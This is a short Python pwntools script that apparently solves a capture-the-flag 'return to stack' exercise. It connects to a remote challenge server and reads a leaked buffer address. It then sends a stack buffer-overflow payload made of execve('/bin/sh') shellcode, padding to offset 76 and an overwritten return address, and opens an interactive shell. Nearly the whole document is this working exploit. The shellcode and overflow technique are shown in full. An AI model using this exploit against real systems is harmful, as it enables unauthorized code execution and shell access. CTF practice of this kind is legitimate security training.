"""
This exercise looks into returning to a stack location.
With ASLR included, I made it print the location of the buffer so that it is easier to reference to.

All you need to do is insert the shellcode and make the return address point to the shell code.
"""

from pwn import *

def main():
	#io = process('./return2stack')
	io = remote("challenge.ctf-fun.xyz", 14012)
	#io = remote("139.59.237.75", 14012)
	#io = remote("139.59.120.14", 14012)

	io.recvuntil(': ')

	buffer_loc = io.recv().decode()[:-1]
	log.info(f"Buffer location received: {buffer_loc}")
	
	# http://shell-storm.org/shellcode/files/shellcode-811.php
	shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
	shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
	shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"

	padding = b'A' * (76 - len(shellcode))

	shell_loc = p32(int(buffer_loc, 16))

	payload = shellcode + padding + shell_loc

	io.sendline(payload)
	io.interactive()

if __name__ == '__main__':
	main()